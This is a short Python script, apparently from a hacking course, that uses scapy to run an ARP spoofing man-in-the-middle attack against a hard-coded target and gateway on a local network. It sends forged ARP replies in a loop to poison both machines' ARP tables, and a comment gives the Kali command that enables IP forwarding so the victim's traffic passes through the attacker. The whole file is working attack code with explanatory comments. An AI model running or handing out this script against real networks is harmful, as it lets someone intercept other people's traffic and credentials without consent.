#!/usr/bin/env python3

# to start port forword on kali run this › echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

import scapy.all as scapy, time, argparse

target_ip = "192.168.10.198"
gateway_ip = "192.168.10.1"



def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip) # creating an ARP request object
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff") # creating an Ether object
    arp_request_broadcast = broadcast/arp_request # combining the two objects
    answered_list = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0] # sending the request and storing the answered and unanswered requests
    return answered_list[0][1].hwsrc # returning the MAC address of the target


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip) # getting the MAC address of the target
    # In Terminal you can run python3 >>> import scapy.all as scapy >>> scapy.ls(scapy.ARP) to see the fields that can be modified
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip) # pdst = IP of the target, hwdst = MAC of the target, psrc = IP of the router
    scapy.send(packet, verbose = False) # sending the packet

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip) # getting the MAC address of the target
    source_mac = get_mac(source_ip) # getting the MAC address of the source
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst  =  destination_mac, psrc = source_ip, hwsrc = source_mac) # pdst = IP of the target, hwdst = MAC of the target, psrc = IP of the router
    scapy.send(packet, verbose = False) # sending the packet

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip) # spoofing the target
        spoof(gateway_ip, target_ip) # spoofing the router
        sent_packets_count += 2 # incrementing the counter
        print("\r [+] Sent " + str(sent_packets_count) + " packets.", end = "") # \r is used to print the output on the same line
        time.sleep(2) # sleeping for 2 seconds

except KeyboardInterrupt:
    print("\n [+] Detected CTRL + C") # printing the message
    restore(target_ip, gateway_ip) # restoring the ARP tables
    restore(gateway_ip, target_ip) # restoring the ARP tables

finally:
    print(" [+] Resetting ARP tables ==> Please wait.")